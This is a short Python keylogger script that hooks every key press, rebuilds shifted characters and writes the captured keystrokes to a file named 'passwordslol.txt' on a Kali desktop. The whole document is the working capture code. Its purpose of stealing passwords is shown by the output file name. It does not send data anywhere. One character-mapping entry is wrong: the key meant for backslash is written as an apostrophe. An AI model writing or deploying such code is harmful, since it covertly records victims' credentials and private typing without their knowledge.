import keyboard

data = ''
shiftPressed = False

shiftChar = {
    "`":"~",
    "1":"!",
    "2":"@",
    "3":"#",
    "4":"$",
    "5":"%",
    "6":"^",
    "7":"&",
    "8":"*",
    "9":"(",
    "0":")",
    "-":"_",
    "=":"+",
    "[":"{",
    "]":"}",
    '\'':'|',
    ";":":",
    "'":'"',
    ",":"<",
    ".":">",
    "/":"?",
    "shift":""
    }

passChar = ["up", "down", "left", "right", "esc", "tab", "caps lock", "ctrl", "shift", "alt", "end", "home"]


while True:
    event = keyboard.read_event()
    if event.event_type == keyboard.KEY_DOWN and event.name == "shift":
        shiftPressed = True
    if event.event_type == keyboard.KEY_UP and event.name == "shift":
        shiftPressed = False
    if event.event_type == keyboard.KEY_DOWN:
        if event.name == "enter":
            data += '\n'
            with open("/home/kali/Desktop/passwordslol.txt", "w") as outFile:
                outFile.write(data)
#             data = ''
        elif event.name == "space":
            data += ' '
        elif event.name == "backspace":
            data += " backspace "
        elif event.name in passChar:
            pass
        else:
            if event.name in shiftChar and shiftPressed:
                data += shiftChar[event.name]
            elif shiftPressed:
                data += event.name.upper()
            else:
                data += event.name



